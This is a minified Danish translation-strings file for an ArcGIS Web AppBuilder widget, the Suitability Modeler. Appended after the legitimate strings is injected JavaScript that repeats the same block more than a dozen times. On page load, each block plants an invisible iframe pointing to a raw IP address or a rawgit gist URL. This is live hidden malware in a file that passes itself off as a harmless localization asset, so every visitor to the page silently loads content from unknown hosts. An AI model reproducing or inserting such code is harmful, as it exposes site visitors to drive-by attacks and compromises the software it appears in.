// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/SuitabilityModeler/nls/strings":{_widgetLabel:"Suitability Modeler",general:{clear:"Ryd",cancel:"Annuller",save:"K\u00f8r",saveAs:"Eksport\u00e9r"},saveModel:{save:"Eksport\u00e9r",title:"Titel: ",summary:"Beskrivelse: ",description:"Beskrivelse: ",tags:"N\u00f8gleord: ",folder:"Mappe: ",homeFolderPattern:"{username} (Hjem)",failed:"Eksport mislykkedes."},util:{colorRamp:{1:"Ekstremt lav",2:"Meget lav",3:"Lav",4:"Lav - mellem",5:"Mellem",6:"H\u00f8j - mellem",7:"H\u00f8j",8:"Meget h\u00f8j",
9:"Ekstremt h\u00f8j",low:"Lav",high:"H\u00f8j",tipPattern:"{label} ({value})",flipCaption:"Vend"}},wro:{caption:"Suitability Modeler",browsePrompt:"V\u00e6gtet overlay-tjeneste",selectLayersCaption:"V\u00e6lg lag",selectLayers:"Lag",designModelCaption:"Designmodel",designModel:"Designmodel",transparency:"Gennemsigtighed",visible:"Synlig",total:"I alt",unableToLoad:"Kan ikke indl\u00e6se model.",projectNotOpen:"Der er ikke noget \u00e5bent projekt.",readMore:"L\u00e6s mere",validation:{validating:"Validerer...",
invalidItemCaption:"Advarsel om v\u00e6gtet overlay-tjeneste",notAnImageService:"Dette element er ikke en billedtjeneste.",notAWroService:"Dette element er ikke en v\u00e6gtet overlay-tjeneste.",undefinedUrl:"Dette elements URL er ikke defineret.",inaccessible:"Denne tjeneste er utilg\u00e6ngelig.",generalError:"Kan ikke \u00e5bne element.",missingFieldPattern:"{field} er et obligatorisk felt",notAllowRasterFunction:"allowRasterFunction skal v\u00e6re sat til sand",notNearestResampling:"defaultResamplingMethod m\u00e5 ikke v\u00e6re N\u00e6rmeste",
notIsWeightedOverlayProp:"N\u00f8gleegenskaben IsWeightedOverlay skal v\u00e6re sat til sand",invalidLink:"URL'en er ugyldig. Kunne ikke \u00e5bne stedet for det valgte lag.",unexpectedError:"Der opstod en uventet tilstand.",rangeMessage:"V\u00e6rdi skal v\u00e6re mellem ${0} og ${1}",rangeMessage100:"V\u00e6rdi skal v\u00e6re mellem 0 og 100",maxLayers:"Da et maksimum p\u00e5 ${0} lag er tilladt for denne tjeneste, skal du fjerne et lag, f\u00f8r du tilf\u00f8jer et nyt.",notFound:"Laget ${0} findes ikke i den v\u00e6gtede overlay-tjeneste",
wroServiceNotDefined:"Ingen v\u00e6gtet overlay-tjeneste er defineret for modellen.",overlayLayerOutputInvalid:"Overlay-laget [${0}] genberegn omr\u00e5der [${1}] outputv\u00e6rdi mangler eller er ugyldig",overlayLayerInputInvalid:"Overlay-laget [${0}] genberegn omr\u00e5der [${1}] input-min./maks.-v\u00e6rdi mangler eller er ugyldig",overlayLayerRangesMissing:"Overlay-laget [${0}] mangler genberegningsomr\u00e5der",overlayLayerWeight:"De v\u00e6gtede overlay-lag skal tilsammen v\u00e6re 100",overlayLayerRequired:"Der kr\u00e6ves mindst \u00e9t overlay-lag",
overlayLayerNotDefined:"Overlay-lag er ikke defineret",requiresColormap:"Denne rasterfunktion kr\u00e6ver et farvekort, men modellen har ikke nogen gyldig farvekortdefinition",createModelError:"Fejl under oprettelse af model",invalidModel:"Modellen er ikke gyldig",imageServiceNotDefined:"Billedtjenestelag er ikke defineret",imageLayerNotDefined:"Billedtjenestelag er ikke defineret",histogramNotDefined:"Der er ikke defineret nogen v\u00e6gtet overlay-histogramfunktion."},colorRampLabel:{"Green Yellow Red":"Gr\u00f8n Gul R\u00f8d",
"Red Yellow Green":"R\u00f8d Gul Gr\u00f8n","Yellow to Dark Red":"Gul til m\u00f8rker\u00f8d","Dark Red to Yellow":"M\u00f8rker\u00f8d til Gul","Light Gray to Dark Gray":"Lysegr\u00e5 til m\u00f8rkegr\u00e5","Dark Gray to Light Gray":"M\u00f8rkegr\u00e5 til lysegr\u00e5","Light Brown to Dark Brown":"Lysebrun til m\u00f8rkebrun","Dark Brown to Light Brown":"M\u00f8rkebrun til lysebrun","Full Spectrum - Bright Red to Blue":"Fuldt spektrum - Lyser\u00f8d til bl\u00e5","Full Spectrum - Bright Blue to Red":"Fuldt spektrum - Lysebl\u00e5 til r\u00f8d",
"Partial Spectrum - Yellow to Blue":"Delvist spektrum - Gul til bl\u00e5","Partial Spectrum - Blue to Yellow":"Delvist spektrum - Bl\u00e5 til gul","Yellow-Green to Dark Blue":"Gul-Gr\u00f8n til m\u00f8rkebl\u00e5","Dark Blue to Yellow-Green":"M\u00f8rkebl\u00e5 til Gul-Gr\u00f8n","Cold to Hot Diverging":"Kold divergerende til varm","Hot to Cold Diverging":"Varm divergerende til kold","Surface - Low to High":"Overflade - Lav til h\u00f8j","Surface - High to Low":"Overflade - H\u00f8j til lav"}},_localized:{}},
"widgets/SuitabilityModeler/setting/nls/strings":{allowSaveAs:"Tillad eksport",startingState:"Starttilstand:",byUrl:"Tom model",byItem:"Pr\u00e6konfigureret model",imageServiceUrl:"Billedtjeneste-URL",validate:"Bekr\u00e6ft",validating:"Validerer...",validated:"URL'en er gyldig.",modelName:"Model",selectModel:"V\u00e6lg",itemSelectorTitle:"V\u00e6lg en model",ok:"OK",cancel:"Annull\u00e9r",description1:"Suitability Modeler hj\u00e6lper dig med at finde den bedste placering af en aktivitet, forudsige risikof\u00f8lsomheden eller identificere, hvor noget sandsynligvis vil ske. Med denne widget kan du kombinere og v\u00e6gte forskellige lag, s\u00e5 du kan evaluere flere faktorer p\u00e5 \u00e9n gang.",
description2:"Suitability Modeler benytter et hurtigt, webbaseret Weighted Raster Overlay til at generere modeller ud fra en tjeneste. Du kan starte fra en tom tilstand for en Weight Raster Overlay (WRO)-tjeneste eller en pr\u00e6konfigureret WRO-model. V\u00e6lg lag, tildel v\u00e6gte, og just\u00e9r lagklassifikationsv\u00e6rdier for at definere din analyse. K\u00f8r derefter modeler-applikationen, visualis\u00e9r resultaterne, og gem eventuelt resultatet som et element i din organisation/portal.",
description3:"L\u00e6r mere om GeoPlanner Suitability Modeler.",_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});